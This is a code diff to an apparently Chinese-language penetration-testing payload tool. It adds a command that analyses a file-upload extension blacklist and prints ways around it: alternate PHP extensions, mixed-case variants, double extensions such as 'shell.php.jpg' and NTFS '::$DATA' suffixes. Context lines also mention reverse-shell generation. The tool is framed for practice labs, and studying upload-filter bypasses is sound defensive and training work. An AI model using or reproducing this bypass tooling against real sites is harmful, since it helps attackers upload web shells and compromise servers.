@@ -472,8 +472,67 @@ def cmd_rce_cmd(args):
     print(f"\n{dim('提示: --shell bash --ip 10.0.0.1 --port 4444 生成反弹 Shell')}")
 
 
+# ═══ Upload 黑名单分析 ═══
+ALL_EXTENSIONS = {'php', 'php3', 'php4', 'php5', 'php7', 'php8', 'phtml', 'pht', 'phps', 'phar', 'phar5', 'shtml', 'cgi'}
+CASE_VARIANTS = {'Php', 'pHp', 'PHP', 'pHp5', 'PhP', 'pHP', 'pHtMl', 'PhP5', 'pHp.'}
+DOUBLE_EXT = ['shell.php.jpg', 'shell.php.png', 'shell.php.gif']
+NTFS_BYPASS = ['shell.php::$DATA', 'shell.php.jpg::$DATA']
+
+def _cmd_upload_analyze(blacklist_str):
+    """分析靶场黑名单，找出绕过方法."""
+    import re
+    blocked = set(re.findall(r'[a-zA-Z0-9]+', blacklist_str.lower()))
+    
+    lines = []
+    lines.append(bold("\n🎯 靶场黑名单分析"))
+    lines.append(f"\n  输入: {dim(blacklist_str)}")
+    lines.append(f"  已拦截: {red(', '.join(sorted(blocked)))}")
+    
+    # 1. 未覆盖后缀
+    safe = sorted(ALL_EXTENSIONS - blocked)
+    if safe:
+        lines.append(f"\n  {green('✅ 可用后缀 (不在黑名单):')} {bold(', '.join(safe))}")
+        if 'pht' in safe:
+            lines.append(f"    🎯 {bold('推荐 .pht')} — 最常见的绕过后缀")
+        if 'phtml' in safe:
+            lines.append(f"    🎯 {bold('推荐 .phtml')} — 常见绕过后缀")
+    else:
+        lines.append(f"\n  {red('❌ 所有常见后缀均在黑名单中')}")
+    
+    # 2. 大小写绕过
+    lines.append(f"\n  {bold('🔤 大小写混合:')}")
+    for v in sorted(CASE_VARIANTS):
+        ext = v.lower().lstrip('.')
+        if ext in blocked:
+            checked = "🟢 可用"
+        else:
+            checked = "⚪"
+        lines.append(f"    {v}  {dim(checked)}")
+    
+    # 3. 双后缀
+    lines.append(f"\n  {bold('📦 双后缀:')}  {dim('(服务器不解析 .jpg 则可用)')}")
+    for v in DOUBLE_EXT:
+        lines.append(f"    {v}")
+    
+    # 4. NTFS
+    lines.append(f"\n  {bold('💾 NTFS 数据流 (Windows):')}  {dim('(IIS/Windows)')}")
+    for v in NTFS_BYPASS:
+        lines.append(f"    {v}")
+    
+    # 5. 总结
+    lines.append(f"\n  {'─'*50}")
+    if safe:
+        lines.append(f"  🏁 {bold(green('首选方案:'))} 用 {bold(','.join(safe[:3]))} 后缀上传")
+    lines.append(f"  🏁 {bold('备用方案:')} 大小写混合 / 双后缀 / NTFS 数据流")
+    
+    print('\n'.join(lines))
+
+
 def cmd_upload(args):
     """文件上传 Payload 命令."""
+    if args.analyze:
+        _cmd_upload_analyze(args.analyze)
+        return
     if args.ext:
         print(bold("\n📎 后缀名绕过:"))
         for cat, payloads in upload.EXT_BYPASS.items():
@@ -1091,6 +1150,7 @@ def build_parser():
     p_upload.add_argument("--htaccess", action="store_true", help=".htaccess Payload")
     p_upload.add_argument("--userini", action="store_true", help=".user.ini Payload")
     p_upload.add_argument("--advanced", action="store_true", help="高级绕过技巧")
+    p_upload.add_argument("--analyze", type=str, metavar="BLACKLIST", help="分析靶场黑名单 (如: php,php3,phtml)")
 
 # ── hashid ──
     p_hashid = sub.add_parser("hashid", help="Hash 类型识别")
